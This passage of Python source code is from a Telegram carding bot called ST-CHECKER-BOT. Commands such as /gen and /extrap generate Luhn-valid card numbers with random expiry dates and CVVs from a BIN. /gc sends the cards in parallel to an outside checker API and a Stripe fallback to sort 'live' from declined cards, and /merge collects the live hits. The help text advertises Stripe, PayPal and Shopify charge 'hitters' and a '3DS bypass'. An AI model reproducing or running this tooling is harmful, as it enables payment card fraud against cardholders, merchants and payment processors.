        _SIG = "⌤ <a href='https://t.me/yadistan'>@yadistan</a>"
        header_html = (
            f"<b>🃏 Gen — {total_gen} Cards Generated\n"
            f"{_SEP}\n"
            f"│  🔢  BIN       ›  <code>{bin_num}</code>\n"
            f"│  🏦  BIN Info  ›  {_b}\n"
            f"│  🏛️  Bank      ›  {_bk}\n"
            f"│  🌍  Country   ›  {_ct}\n"
            f"│  📦  Count     ›  {total_gen} cards\n"
            f"{_SEP}\n"
            f"       {_SIG}</b>"
        )

        if amount > 100:
            # ── Send as .txt file ──────────────────────────────────
            import io
            file_content = '\n'.join(cards)
            file_bytes   = file_content.encode('utf-8')
            file_obj     = io.BytesIO(file_bytes)
            file_obj.name = f"gen_{bin_num}_{total_gen}.txt"
            bot.send_document(
                message.chat.id,
                file_obj,
                caption=header_html,
                parse_mode='HTML',
                reply_to_message_id=message.message_id
            )
        else:
            # ── Send as inline message ─────────────────────────────
            cards_text = '\n'.join([f"<code>{c}</code>" for c in cards])
            bot.reply_to(
                message,
                f"{header_html}\n\n{cards_text}",
                parse_mode='HTML',
                disable_web_page_preview=True
            )

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["extrap"])
def extrap_command(message):
    def my_function():
        id = message.from_user.id

        try:
            args = message.text.split(' ', 1)[1].strip()
        except IndexError:
            bot.reply_to(message,
                "<b>╔══════════════════════════╗\n"
                "║  🎲  E X T R A P   G E N  ║\n"
                "╚══════════════════════════╝\n"
                "│\n"
                "│ Usage:\n"
                "│  <code>/extrap BIN</code>       → 10 cards\n"
                "│  <code>/extrap BIN amount</code> → N cards\n"
                "│\n"
                "│ Examples:\n"
                "│  <code>/extrap 411111</code>\n"
                "│  <code>/extrap 5425320 20</code>\n"
                "│  <code>/extrap 4111|12|26|xxx 50</code>\n"
                "└──────────────────────────</b>",
                parse_mode='HTML')
            return

        parts = args.split()
        bin_input = parts[0].strip()

        amount = 10
        if len(parts) > 1:
            try:
                amount = int(parts[1])
                if amount < 1: amount = 1
                elif amount > 999999: amount = 999999
            except ValueError:
                amount = 10

        has_pipe = '|' in bin_input
        if has_pipe:
            card_parts = bin_input.split('|')
            bin_base   = card_parts[0].strip()
            mm_tpl     = card_parts[1].strip() if len(card_parts) > 1 else 'xx'
            yy_tpl     = card_parts[2].strip() if len(card_parts) > 2 else 'xx'
            cvv_tpl    = card_parts[3].strip() if len(card_parts) > 3 else 'xxx'
        else:
            bin_base = bin_input.replace('x','').replace('X','')
            mm_tpl = yy_tpl = 'xx'
            cvv_tpl = 'xxx'

        if len(bin_base.replace('x','').replace('X','')) < 6:
            bot.reply_to(message, "<b>❌ BIN must be at least 6 digits.</b>", parse_mode='HTML')
            return

        def _luhn_ok(n):
            d = [int(x) for x in n]
            odd = d[-1::-2]; even = d[-2::-2]
            return (sum(odd) + sum(sum(divmod(x*2,10)) for x in even)) % 10 == 0

        is_amex   = bin_base[0] == '3'
        clen      = 15 if is_amex else 16
        cvv_len   = 4  if is_amex else 3

        def _gen_one():
            cc = ''
            for ch in bin_base:
                cc += str(random.randint(0,9)) if ch.lower()=='x' else ch
            while len(cc) < clen - 1:
                cc += str(random.randint(0,9))
            for d in range(10):
                if _luhn_ok(cc + str(d)):
                    cc += str(d); break
            mm  = str(random.randint(1,12)).zfill(2)  if mm_tpl.lower() in ('xx','x','')  else mm_tpl.zfill(2)
            cur = datetime.now().year % 100
            yy  = str(random.randint(cur+1, cur+5)).zfill(2) if yy_tpl.lower() in ('xx','x','') else yy_tpl.zfill(2)
            cvv = (str(random.randint(1000,9999)) if is_amex else str(random.randint(100,999)).zfill(3)) if cvv_tpl.lower() in ('xxx','xxxx','xx','x','') else cvv_tpl.zfill(cvv_len)
            return f"{cc}|{mm}|{yy}|{cvv}"

        cards = []; seen = set(); att = 0
        while len(cards) < amount and att < amount * 10:
            c = _gen_one()
            if c not in seen:
                seen.add(c); cards.append(c)
            att += 1

        bin_num = bin_base[:6]
        bin_info, bank, country, cc_flag = get_bin_info(bin_num)

        header = (
            f"<b>✨ ✦ ─── E X T R A P ─── ✦ ✨\n"
            f"╔══════════════════════════╗\n"
            f"║  🎲  E X T R A P   G E N ║\n"
            f"╚══════════════════════════╝\n"
            f"│\n"
            f"│ 🔢 BIN    : <code>{bin_num}</code>\n"
            f"│ 🔖 Info   : {bin_info}\n"
            f"│ 🏦 Bank   : {bank}\n"
            f"│ 🌍 Country: {country} {cc_flag}\n"
            f"│ 📦 Total  : {len(cards)} cards\n"
            f"│\n"
        )

        if amount > 100:
            import io
            file_content = '\n'.join(cards)
            file_obj = io.BytesIO(file_content.encode('utf-8'))
            file_obj.name = f"extrap_{bin_num}_{len(cards)}.txt"
            bot.send_document(
                message.chat.id, file_obj,
                caption=header + f"└──────────────────────────\n       ⌤ Bot by @yadistan</b>",
                parse_mode='HTML',
                reply_to_message_id=message.message_id
            )
        else:
            cards_text = "\n".join(f"│ <code>{c}</code>" for c in cards)
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="🤖 ST-Checker", url="https://t.me/stcheckerbot"))
            bot.reply_to(
                message,
                header + cards_text + f"\n└──────────────────────────\n       ⌤ Bot by @yadistan</b>",
                parse_mode='HTML',
                reply_markup=kb
            )

    threading.Thread(target=my_function).start()


# ================== /gc — Gen + chkr.cc Check ==================
@bot.message_handler(commands=["gc"])
def gc_command(message):
    def _gc_worker():
        uid = message.from_user.id

        # ── Plan & rate-limit check ─────────────────────────────────────
        BL, _expired = get_user_plan(uid)
        if _expired:
            bot.reply_to(message, UI.fmt_expired(), parse_mode='HTML')
            return
        allowed, wait = check_rate_limit(uid, BL)
        if not allowed:
            bot.reply_to(message, UI.fmt_rate_limit(wait), parse_mode='HTML')
            return

        log_command(message, query_type='gateway', gateway='gc')

        # ── Parse args (handles space or newline after command) ──────────
        _raw = (message.text or '').strip()
        _ws  = re.search(r'\s', _raw)
        args = _raw[_ws.end():].strip() if _ws else ''

        # ── Card regex: 13-19 digits | mm | yy[yy] | cvv ────────────────
        _CARD_RE = re.compile(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b')
        _BARE_RE = re.compile(r'^\d{13,19}$')

        def _extract_cards(text):
            found = _CARD_RE.findall(text)
            if found:
                return [f"{a}|{b}|{c}|{d}" for a, b, c, d in found]
            # fallback: bare card numbers on their own lines
            return [ln.strip() for ln in text.splitlines()
                    if _BARE_RE.match(ln.strip())]

        # Collect user-supplied cards from args or replied message
        _user_cards = _extract_cards(args) if args else []
        if not _user_cards and message.reply_to_message:
            _user_cards = _extract_cards(message.reply_to_message.text or '')

        # No args and no cards → show usage
        if not args and not _user_cards:
            bot.reply_to(message,
                "<b>╔══════════════════════════╗\n"
                "║  ⚡  G E N  +  C H E C K  ║\n"
                "╚══════════════════════════╝\n"
                "│\n"
                "│ 📌 Usage:\n"
                "│  <code>.gc BIN</code>             → gen 10 + check\n"
                "│  <code>.gc BIN N</code>            → gen N + check\n"
                "│  <code>.gc BIN|mm|yy|cvv N</code>  → fixed date/cvv\n"
                "│\n"
                "│ 🃏 Check your own cards:\n"
                "│  <code>.gc 4111111111111111|12|26|123</code>\n"
                "│  Multi-line or reply to a card list\n"
                "│\n"
                "│ 💡 Examples:\n"
                "│  <code>.gc 411111</code>\n"
                "│  <code>.gc 542532|xx|xx|xxx 50</code>\n"
                "│\n"
                "│ ⚡ Checker: chkr.cc  →  Live / 3DS / Dead\n"
                "└──────────────────────────</b>",
                parse_mode='HTML')
            return

        _custom_mode = bool(_user_cards)

        # ── Luhn helpers ─────────────────────────────────────────────────
        def _luhn_check_digit(partial):
            """Return the single check digit that makes `partial + digit` Luhn-valid."""
            for d in range(10):
                n = partial + str(d)
                digits = [int(x) for x in n]
                odd  = digits[-1::-2]
                even = digits[-2::-2]
                if (sum(odd) + sum(sum(divmod(x * 2, 10)) for x in even)) % 10 == 0:
                    return str(d)
            return '0'   # fallback (should never happen for valid partial)

        # ── Card network from first digit(s) ─────────────────────────────
        def _detect_network(bin6):
            p2 = int(bin6[:2])
            if bin6[0] == '4':
                return 'Visa', 16, 3
            if bin6[0] == '5' or (bin6[0] == '2' and 221 <= int(bin6[:3]) <= 720):
                return 'Mastercard', 16, 3
            if p2 in (34, 37):
                return 'Amex', 15, 4
            if bin6[0] == '6':
                return 'Discover', 16, 3
            if bin6[:2] == '35':
                return 'JCB', 16, 3
            if bin6[:2] in ('30', '36', '38'):
                return 'Diners', 14, 3
            return '', 16, 3   # default to 16-digit

        # ── Generate cards from BIN ──────────────────────────────────────
        if _custom_mode:
            cards   = _user_cards[:500]
            total   = len(cards)
            bin_num = (cards[0].split('|')[0] if '|' in cards[0] else cards[0])[:6]
        else:
            parts     = args.split()
            bin_input = parts[0].strip()
            try:
                amount = max(1, min(int(parts[1]), 500)) if len(parts) > 1 else 10
            except (ValueError, IndexError):
                amount = 10

            has_pipe = '|' in bin_input
            if has_pipe:
                _bp   = bin_input.split('|')
                bin_base = _bp[0].strip()
                mm_tpl   = _bp[1].strip() if len(_bp) > 1 else 'xx'
                yy_tpl   = _bp[2].strip() if len(_bp) > 2 else 'xx'
                cvv_tpl  = _bp[3].strip() if len(_bp) > 3 else 'xxx'
            else:
                bin_base = bin_input
                mm_tpl = yy_tpl = 'xx'
                cvv_tpl = 'xxx'

            # Strip x placeholders to count real digits
            _digits_only = re.sub(r'[xX]', '', bin_base)
            if len(_digits_only) < 6:
                bot.reply_to(message, "<b>❌ BIN needs at least 6 digits.</b>", parse_mode='HTML')
                return

            bin_num = _digits_only[:6]
            _net, clen, cvv_len = _detect_network(bin_num)

            _cur_yy = datetime.now().year % 100

            def _gen_one():
                # Fill x's with random digits
                cc = ''.join(str(random.randint(0, 9)) if c.lower() == 'x' else c
                             for c in bin_base)
                # Pad to clen-1 then append Luhn check digit
                while len(cc) < clen - 1:
                    cc += str(random.randint(0, 9))
                cc = cc[:clen - 1] + _luhn_check_digit(cc[:clen - 1])

                mm  = str(random.randint(1, 12)).zfill(2) \
                      if mm_tpl.lower().strip('x') == '' else mm_tpl.zfill(2)
                yy  = str(random.randint(_cur_yy + 1, _cur_yy + 5)).zfill(2) \
                      if yy_tpl.lower().strip('x') == '' else yy_tpl.zfill(2)
                cvv = (str(random.randint(1000, 9999)) if cvv_len == 4
                       else str(random.randint(100, 999)).zfill(3)) \
                      if cvv_tpl.lower().strip('x') == '' else cvv_tpl

                return f"{cc}|{mm}|{yy}|{cvv}"

            cards = []; seen = set(); attempts = 0
            while len(cards) < amount and attempts < amount * 15:
                c = _gen_one()
                if c not in seen:
                    seen.add(c)
                    cards.append(c)
                attempts += 1

            total = len(cards)

        bin_info, bank, _country, cc_flag = get_bin_info(bin_num)
        if not _custom_mode:
            _net_fallback = {'4': 'Visa', '5': 'Mastercard', '3': 'Amex', '6': 'Discover'}.get(bin_num[0], '')
        else:
            _net_fallback = {'4': 'Visa', '5': 'Mastercard', '3': 'Amex', '6': 'Discover'}.get(bin_num[0], '')
        _info_line = bin_info if bin_info not in ('Unknown', 'Unknown - ', '', None) else _net_fallback
        _bank_line = bank   if bank   not in ('Unknown', '', None) else '—'

        # ── Stop button state ────────────────────────────────────────────
        stopuser.setdefault(str(uid), {})['status'] = 'start'

        live = dead = otp = checked = 0
        hits          = []
        results_lines = []
        t_start       = time.time()
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton("🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))

        _mode_label = "CC CHECK" if _custom_mode else "GEN + CHECK"

        msg = bot.reply_to(message,
            f"<b>⚡ ════ {_mode_label} ════ ⚡\n"
            f"│ 🎰 BIN: <code>{bin_num}</code> {cc_flag}\n"
            f"│ 🏦 {_bank_line}  ·  💳 {_info_line}\n"
            f"│ 🃏 {total} cards  ·  ⏳ Starting...\n"
            f"└──────────────────────────</b>",
            parse_mode='HTML', reply_markup=stop_kb)

        def _build_msg(status="⏳ Checking..."):
            _pct  = int(checked / total * 12) if total else 0
            _bar  = '█' * _pct + '░' * (12 - _pct)
            _pct_n = int(checked / total * 100) if total else 0
            _hdr  = "C C   C H E C K   M O D E" if _custom_mode else "C H K R . C C   A P I"
            h = (
                f"<b>⚡ ════ {_mode_label} ════ ⚡\n"
                f"╔══════════════════════════╗\n"
                f"║  ⚡  {_hdr}\n"
                f"╚══════════════════════════╝\n"
                f"│ 🎰 BIN: <code>{bin_num}</code> {cc_flag}  ·  {total} cards\n"
                f"│ 🏦 {_bank_line}  ·  💳 {_info_line}\n"
                f"│\n"
                f"│ [{_bar}] {_pct_n}%\n"
                f"│ 🔢 {checked}/{total}  ·  {status}\n"
                f"├──────────────────────────\n"
                f"│ ✅ Live: {live}  ⚠️ OTP/3DS: {otp}  ❌ Dead: {dead}\n"
                f"│\n"
            )
            body = "\n".join(results_lines[-15:])
            return h + body + "\n└──────────────────────────\n       ⌤ Bot by @yadistan</b>"

        # ── 3DS / auth keyword set ───────────────────────────────────────
        _3DS_KEYS = frozenset(("authenticate", "authentication", "3d secure", "3ds",
                               "requires_action", "challenge", "otp",
                               "unable to complete", "issuer", "verify"))

        # ── Decline reason → short label ─────────────────────────────────
        _REASON_MAP = [
            ("test mode",                    ("🚫", "Test Mode")),
            ("test card",                    ("🚫", "Test Mode")),
            ("insufficient",                 ("❌", "Insufficient")),
            ("do not honor",                 ("❌", "Do Not Honor")),
            ("expired",                      ("❌", "Expired")),
            ("security code",                ("❌", "Bad CVV")),
            ("incorrect number",             ("❌", "Bad Number")),
            ("invalid number",               ("❌", "Bad Number")),
            ("not supported",                ("❌", "Not Supported")),
            ("stolen",                       ("❌", "Stolen")),
            ("lost",                         ("❌", "Lost Card")),
            ("pickup",                       ("❌", "Pick Up")),
            ("pick up",                      ("❌", "Pick Up")),
            ("blocked",                      ("❌", "Blocked")),
            ("restricted",                   ("❌", "Restricted")),
            ("limit",                        ("❌", "Over Limit")),
            ("processing",                   ("❌", "Processing Err")),
            ("declined",                     ("❌", "Declined")),
            ("card was declined",            ("❌", "Declined")),
        ]

        def _classify_decline(rmsg_low):
            """Return (emoji, label) for any dead/declined response."""
            for keyword, result in _REASON_MAP:
                if keyword in rmsg_low:
                    return result
            return ("❌", "Declined")

        # ── 2-tier CC checker: chkr.cc (accurate) → stripe_auth_ex (fallback) ──

        def _normalize_resp(data):
            """
            Normalize checker API response to unified code format:
              code 1 = Live/Approved
              code 2 = 3DS/OTP
              code 3 = Declined/Dead
              code -1 = Error/Timeout
            """
            if not isinstance(data, dict):
                return {"code": -1, "message": ""}

            msg = str(data.get("message") or data.get("response") or "").strip()
            msg_l = msg.lower()

            # Already has numeric code (chkr.cc style)
            raw_code = data.get("code")
            if raw_code is not None:
                try:
                    c = int(raw_code)
                    if c == 3 and any(k in msg_l for k in ("3ds", "otp", "authenticate", "requires_action")):
                        return {"code": 2, "message": msg}
                    return {"code": c, "message": msg}
                except (ValueError, TypeError):
                    pass

            # Text-based status field
            status = str(data.get("status") or data.get("result") or "").lower()
            resp_field = str(data.get("response") or "").lower()
            _all = status + " " + msg_l + " " + resp_field

            if any(k in _all for k in ("approved", "live", "success", "charged")):
                if any(k in _all for k in ("3ds", "otp", "authenticate", "requires_action")):
                    return {"code": 2, "message": msg}
                return {"code": 1, "message": msg}
            if any(k in _all for k in ("3ds", "otp", "authenticate", "redirect", "requires_action")):
                return {"code": 2, "message": msg}
            if any(k in _all for k in ("declined", "dead", "failed", "invalid",
                                        "error", "rejected", "refus",
                                        "insufficient", "honor", "expired",
                                        "stolen", "lost", "blocked", "restricted")):
                return {"code": 3, "message": msg}
            return {"code": -1, "message": msg}

        def _is_rate_limited(data):
            """True when the API signals a quota/rate-limit error."""
            if not isinstance(data, dict):
                return False
            msg_l = str(data.get("message") or "").lower()
            err = data.get("error")
            return bool(err) and any(k in msg_l for k in ("quota", "rate", "limit", "too many"))

        def _chkrcc(card):
            """
            2-tier CC checker:
              Tier 1 — api.chkr.cc     (accurate results, 2 retries, 8s timeout)
              Tier 2 — stripe_auth_ex  (reliable multi-WCS fallback)
            """
            # ── Tier 1: chkr.cc (accurate, gives live results) ───────────
            for _attempt in range(2):
                try:
                    r = requests.post(
                        "https://api.chkr.cc/",
                        json={"data": card},
                        headers={"Content-Type": "application/json"},
                        timeout=8)
                    if r.status_code == 200:
                        data = r.json()
                        if _is_rate_limited(data):
                            time.sleep(1)
                            continue   # retry once
                        return _normalize_resp(data)
                    elif r.status_code == 429:
                        time.sleep(1.5)
                        continue       # retry once after rate limit
                except Exception:
                    pass               # timeout/conn error → retry once

            # ── Tier 2: stripe_auth_ex (multi-WCS, reliable fallback) ────
            try:
                res, _lbl = stripe_auth_ex(card, None)
                res_l = res.lower()
                if "approved" in res_l and "otp" not in res_l:
                    return {"code": 1, "message": res}
                if any(k in res_l for k in ("otp", "requires_action", "3ds", "authenticate")):
                    return {"code": 2, "message": res}
                if any(k in res_l for k in ("declined", "insufficient", "honor", "expired")):
                    return {"code": 3, "message": res}
            except Exception:
                pass

            return {"code": -1, "message": ""}

        # ── Parallel checking loop (3 concurrent workers) ───────────────
        import concurrent.futures as _cf
        import threading as _th

        _live_hit_holder    = [None, []]
        _SKIP_REASON_LABELS = frozenset(("Live", "3DS/OTP", "Timeout"))
        _results_lock       = _th.Lock()   # guards shared counters + lists
        _last_edit          = [0.0]        # rate-limit Telegram edits

        def _process_card(cc):
            """Check one card and update shared state. Returns True = stop signal."""
            if stopuser.get(str(uid), {}).get('status') == 'stop':
                return True

            resp     = _chkrcc(cc)
            code     = resp.get("code", -1)
            rmsg     = (resp.get("message") or "").strip()
            rmsg_low = rmsg.lower()

            with _results_lock:
                nonlocal checked, live, dead, otp

                checked += 1

                # ── Classify ─────────────────────────────────────────────
                if code == 1:
                    live += 1
                    hits.append(cc)
                    _add_to_merge(uid, cc)
                    _notify_live_hit(message.chat.id, cc, "gc", holder=_live_hit_holder)
                    emoji, label = "✅", "Live"

                elif code == 2 or any(k in rmsg_low for k in _3DS_KEYS):
                    otp += 1
                    emoji, label = "⚠️", "3DS/OTP"

                elif code == -1:
                    dead += 1
                    emoji, label = "🔌", "Timeout"

                else:
                    if any(k in rmsg_low for k in _3DS_KEYS):
                        otp += 1
                        emoji, label = "⚠️", "3DS/OTP"
                    else:
                        dead += 1
                        emoji, label = _classify_decline(rmsg_low)

                # ── Format line ──────────────────────────────────────────
                _sfx = ""
                if label not in _SKIP_REASON_LABELS and rmsg:
                    _short = _classify_decline(rmsg_low)[1]
                    if _short and _short.lower() != label.lower():
                        _sfx = f"  <i>({_short})</i>"
                results_lines.append(f"{emoji} <b>{label}</b>{_sfx}  ·  <code>{cc}</code>")

                # ── Edit message (max 1 edit / 1.5s to avoid flood wait) ─
                _now = time.time()
                if _now - _last_edit[0] >= 1.5:
                    _last_edit[0] = _now
                    try:
                        bot.edit_message_text(_build_msg(), message.chat.id,
                                              msg.message_id, parse_mode='HTML',
                                              reply_markup=stop_kb)
                    except Exception:
                        pass

            return False  # keep going

        # ── Concurrency: 3 workers (balanced for chkr.cc rate limits) ────
        _WORKERS = min(3, total)
        _stopped = False
        _stop_event = _th.Event()   # signals workers to abort early

        def _process_card_guarded(cc):
            if _stop_event.is_set():
                return True
            return _process_card(cc)

        _pool = _cf.ThreadPoolExecutor(max_workers=_WORKERS)
        _futs = [_pool.submit(_process_card_guarded, cc) for cc in cards]
        for _fut in _cf.as_completed(_futs):
            try:
                if _fut.result():           # stop signal returned
                    _stopped = True
                    _stop_event.set()       # tell remaining workers to skip
                    break
            except Exception:
                pass
        _pool.shutdown(wait=False)          # don't block; remaining threads finish fast

        # ── Final summary update ─────────────────────────────────────────
        elapsed_total = time.time() - t_start
        _final_status = "🛑 STOPPED" if _stopped else f"✅ Done!  ·  ⏱️ {elapsed_total:.1f}s"
        try:
            bot.edit_message_text(
                _build_msg(_final_status),
                message.chat.id, msg.message_id, parse_mode='HTML')
        except Exception:
            pass

        # ── Send live hits summary if any ────────────────────────────────
        if hits:
            try:
                hits_kb = types.InlineKeyboardMarkup(row_width=2)
                hits_kb.add(
                    types.InlineKeyboardButton("💬 Support",    url="https://t.me/yadistan"),
                    types.InlineKeyboardButton("🤖 ST-Checker", url="https://t.me/stcheckerbot")
                )
                hit_rate = f"{len(hits)/checked*100:.1f}" if checked else "0.0"
                bot.send_message(
                    message.chat.id,
                    text=(
                        f"<b>✨ ✦ ─── L I V E   H I T S ─── ✦ ✨\n"
                        f"╔══════════════════════════╗\n"
                        f"║  ✅  A P P R O V E D  !  ║\n"
                        f"╚══════════════════════════╝\n"
                        f"│ 📊 Hits: {len(hits)}/{checked}  ·  {hit_rate}% rate\n"
                        f"│ 🎰 BIN: {bin_num}  {cc_flag}  ·  {_info_line}\n"
                        f"│ ⏱️ Time: {elapsed_total:.1f}s\n"
                        f"└──────────────────────────</b>\n"
                        f"<code>{chr(10).join(hits)}</code>"
                    ),
                    parse_mode='HTML', reply_markup=hits_kb,
                    disable_web_page_preview=True
                )
            except Exception:
                pass

    threading.Thread(target=_gc_worker, daemon=True).start()


# ================== /merge — Combine all live hits ==================
@bot.message_handler(commands=["merge"])
def merge_command(message):
    uid  = message.from_user.id
    hits = _merge_store.get(int(uid), [])

    if not hits:
        bot.reply_to(message,
            "<b>📭 Koi live hits nahi hain abhi.\n\n"
            "Pehle koi checker run karo — sab live CCs yahan collect ho jaenge.</b>",
            parse_mode='HTML')
        return

    all_ccs = "\n".join(hits)
    count   = len(hits)

    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("🗑 Clear List",   callback_data=f"mgclear_{uid}"),
        types.InlineKeyboardButton("💬 Support",      url="https://t.me/yadistan"),
    )

    out = (
        f"<b>✨ ✦ ─── M E R G E D   H I T S ─── ✦ ✨\n"
        f"╔══════════════════════════╗\n"
        f"║  🔗  MERGED: {count} CCs{' ' * max(0, 6 - len(str(count)))}      ║\n"
        f"╚══════════════════════════╝\n"
        f"│ 💳 All live CCs combined below:\n"
        f"└──────────────────────────</b>\n"
        f"<code>{all_ccs}</code>"
    )
    bot.reply_to(message, out, parse_mode='HTML', reply_markup=kb,
                 disable_web_page_preview=True)


@bot.callback_query_handler(func=lambda c: c.data.startswith('mgclear_'))
def merge_clear_callback(call):
    try:
        owner_uid = int(call.data.split('_', 1)[1])
    except Exception:
        bot.answer_callback_query(call.id, "❌ Error.")
        return
    if call.from_user.id != owner_uid:
        bot.answer_callback_query(call.id, "❌ Sirf owner clear kar sakta hai.", show_alert=True)
        return
    _merge_store[owner_uid] = []
    bot.answer_callback_query(call.id, "✅ Merge list clear ho gayi!")
    try:
        bot.edit_message_text(
            "<b>🗑 Merge list cleared.\n\nNaye hits add honge jab aap checkers chalao.</b>",
            call.message.chat.id, call.message.message_id, parse_mode='HTML')
    except Exception:
        pass
# ================== /merge END ==================


@bot.message_handler(commands=["bin"])
def bin_command(message):
    def my_function():
        try:
            bin_input = message.text.split(' ', 1)[1].strip()
        except IndexError:
            bot.reply_to(message,
                "<b>╔══════════════════════════╗\n"
                "║  🔍  B I N  L O O K U P  ║\n"
                "╚══════════════════════════╝\n"
                "│\n"
                "│ 📌 Usage:\n"
                "│  <code>/bin 411111</code>\n"
                "│  <code>/bin 554423</code>\n"
                "│\n"
                "│ ⚡ 5 APIs — auto fallback\n"
                "└──────────────────────────</b>",
                parse_mode='HTML')
            return

        bin_num = re.sub(r'\D', '', bin_input)[:6]
        if len(bin_num) < 6:
            bot.reply_to(message,
                "<b>❌ BIN must be at least 6 digits.</b>",
                parse_mode='HTML')
            return

        msg = bot.reply_to(message,
            f"<b>🔍 Looking up BIN <code>{bin_num}</code>... ⏳</b>",
            parse_mode='HTML')

        d = _bin_lookup_all(bin_num)

        brand        = d["brand"]
        card_type    = d["card_type"]
        level        = d["level"]
        bank         = d["bank"]
        country      = d["country"]
        country_code = d["country_code"]

        # Card type emoji
        brand_lower = brand.lower()
        if "visa" in brand_lower:
            brand_em = "💙"
        elif "master" in brand_lower:
            brand_em = "🔴"
        elif "amex" in brand_lower or "american" in brand_lower:
            brand_em = "🟢"
        elif "discover" in brand_lower:
            brand_em = "🟠"
        elif "unionpay" in brand_lower or "union" in brand_lower:
            brand_em = "🔴"
        else:
            brand_em = "💳"

        type_em  = "💳" if "credit" in card_type.lower() else ("🏧" if "debit" in card_type.lower() else "💳")
        level_line = f"│ 🏷️ Level    : <b>{level}</b>\n" if level else ""

        if brand == "Unknown" and bank == "Unknown":
            result_text = (
                f"<b>╔══════════════════════════╗\n"
                f"║  🔍  B I N  L O O K U P  ║\n"
                f"╚══════════════════════════╝\n"
                f"│ ❌ BIN not found in any database\n"
                f"│ BIN: <code>{bin_num}</code>\n"
                f"└──────────────────────────</b>"
            )
        else:
            result_text = (
                f"<b>╔══════════════════════════╗\n"
                f"║  🔍  B I N  L O O K U P  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│ 🔢 BIN      : <code>{bin_num}</code>\n"
                f"│ {brand_em} Brand    : <b>{brand}</b>\n"
                f"│ {type_em} Type     : <b>{card_type or 'Unknown'}</b>\n"
                f"{level_line}"
                f"│ 🏦 Bank     : <b>{bank}</b>\n"
                f"│ 🌍 Country  : <b>{country}</b> [{country_code}]\n"
                f"└──────────────────────────</b>"
            )

        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=result_text,
                parse_mode='HTML')
        except Exception:
            bot.send_message(message.chat.id, result_text, parse_mode='HTML')

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ── Help text templates (edit here to update /help output) ─────────────────

def _build_help_msg1(name, is_vip, BL, current_amount):
    """Page 1 — Header + Smart Commands + Batch Commands."""
    vip_badge  = "⭐ VIP"  if is_vip else "🆓 Free"
    plan_label = "Active ✅" if is_vip else "Upgrade 🚀"
    lock       = "✅" if is_vip else "🔒"

    return (
        # ── Header ─────────────────────────────────────────────────────
        f"<b>╔══════════════════════════╗\n"
        f"║  ⚡  ST-CHECKER-BOT       ║\n"
        f"╚══════════════════════════╝</b>\n"
        f"👤 <b>{name}</b>  ·  {vip_badge}  ·  💵 <code>${current_amount}</code>\n"
        f"<i>Tip: <code>.</code> and <code>/</code> both work — e.g. <code>.chk</code> = <code>/chk</code></i>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        # ── Smart Commands ──────────────────────────────────────────────
        "⚡ <b>SMART COMMANDS</b>  <i>(auto-detect single or multi)</i>\n"
        "┌──────────────────────────────\n"
        f"│ <code>.dr</code>  card  →  DrGaM $500 Stripe 🔥  [{lock} VIP]\n"
        f"│ <code>.st</code>  card  →  Stripe charge ${current_amount}  [{lock} VIP]\n"
        "│ <code>.chk</code>  card  →  Non-SK checker (WCS)\n"
        "│ <code>.lchk</code> card →  Luhn validator (instant, no API) 🔎\n"
        "│ <code>.vbv</code>  card  →  Braintree 3DS auth\n"
        f"│ <code>.p</code>   card  →  PayPal charge ${current_amount} ⚡\n"
        f"│ <code>.sk</code>  sk_live_xxx  card  →  Custom SK charge  [{lock} VIP]\n"
        "└──────────────────────────────\n"
        "<i>📌 These accept 1 card (instant) or many cards (auto mass)</i>\n\n"
        "  <b>Single:</b>\n"
        "  <code>.dr 4111111111111111|12|25|123</code>\n"
        "  <b>Multi:</b>\n"
        "  <code>.dr 4111111111111111|12|25|123\n"
        "  5200000000000007|06|26|456</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        # ── Batch Commands ──────────────────────────────────────────────
        "🚀 <b>BATCH COMMANDS</b>  <i>(optimized for bulk)</i>\n"
        "┌──────────────────────────────\n"
        "│ <code>.chkm</code> 411111 20    →  Gen BIN → auto mass check\n"
        "│ <code>.chkm</code> card1↵card2  →  Mass Non-SK check\n"
        "│ <code>.vbvm</code> card1↵card2  →  Mass Braintree 3DS\n"
        f"│ <code>.pp</code>   card1↵card2  →  Mass PayPal ${current_amount}\n"
        f"│ <code>.skm</code>  sk_live_xxx↵card1↵...  →  Mass SK charge  [{lock} VIP]\n"
        "└──────────────────────────────\n"
        "<i>📌 Send cards one per line · invalid lines auto-skipped · max 500</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        # ── OC / Hitter Pipeline ────────────────────────────────────────
        "🌐 <b>ADVANCED HITTERS</b>\n"
        "┌──────────────────────────────\n"
        "│ <code>.oc</code>  URL card    →  OC external checker\n"
        "│ <code>.sco</code> URL         →  Stripe Checkout checker\n"
        "│ <code>.gco</code> BIN URL     →  Gen → Live → SCO pipeline\n"
        "│ <code>.pi</code>  URL         →  PI Direct 3DS bypass\n"
        "│ <code>.gpi</code> BIN URL     →  Gen → Live → PI pipeline\n"
        "│ <code>.h</code>   URL         →  Playwright browser hitter\n"
        "│ <code>.gh</code>  BIN URL     →  Gen → Live → Playwright\n"
        "│ <code>.b3</code>              →  Braintree $0 auth\n"
        "│ <code>.brt</code>             →  Braintree $1 charge\n"
        "│ <code>.br</code>              →  Bravehound $1\n"
        "│ <code>.sh</code>              →  Sinket Hitter\n"
        "│ <code>.ah</code>              →  Auto Hitter\n"
        "│ <code>.m3ds</code> card sk pk  →  Mohio 3DS Auto-Bypass 🔥\n"
        "│ <code>.co2</code>  card        →  StripV2 Checker ⚡ NEW\n"
        "└──────────────────────────────\n\n"

        # ── Shopify Gateways ────────────────────────────────────────────
        "🛒 <b>SHOPIFY GATEWAYS</b>  <i>[VIP]</i>\n"
        "┌──────────────────────────────\n"
        "│ <code>.sp</code>   URL card   →  Shopify v6 (auto cheapest product)\n"
        "│ <code>.sp2</code>  card       →  Shopify Gate1 async ⚡ NEW\n"
        "│ <code>.sp14</code> card       →  Shopify Gate2 v14 async 🔥 NEW\n"
